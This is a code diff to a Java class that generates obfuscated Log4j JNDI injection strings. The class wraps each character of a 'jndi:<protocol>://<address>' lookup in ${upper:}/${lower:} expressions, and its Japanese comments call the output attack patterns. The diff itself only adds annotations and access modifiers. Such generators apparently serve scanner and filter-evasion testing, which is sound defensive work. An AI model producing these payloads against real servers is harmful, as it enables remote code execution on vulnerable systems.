@@ -1,5 +1,7 @@
 package org.yuudai;
 
+import org.jetbrains.annotations.NotNull;
+
 /**
  * ${upper:}や${lower:}を使って難読化された攻撃パターンを生成するクラス
  */
@@ -10,7 +12,7 @@ class UpperLowerObfuscator extends Obfuscator {
      * 難読化前の攻撃パターンを生成するメソッド
      * @return 難読化を行う前の攻撃パターン（先頭の"${"と最後の"}"を除く）
      */
-    String GenerateTargetString() {
+    protected @NotNull String GenerateTargetString() {
         return jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address;
     }
 
@@ -19,7 +21,7 @@ class UpperLowerObfuscator extends Obfuscator {
      * @return ${upper:}と${lower:}によって難読化された攻撃パターン
      */
     @Override
-    String GenerateObfuscatedString() {
+    protected @NotNull String GenerateObfuscatedString() {
         return first + UpperLowerObfuscation(GenerateTargetString()) + "}";
     }
 
@@ -29,7 +31,7 @@ class UpperLowerObfuscator extends Obfuscator {
      * @return 難読化された攻撃パターン
      */
 
-    String UpperLowerObfuscation(String target) {
+    private @NotNull String UpperLowerObfuscation(@NotNull String target) {
         StringBuilder builder = new StringBuilder();
         for (char c:target.toCharArray()) {
             builder.append(ObfuscatorUtils.SelectRandom(parts).replace('*', c));
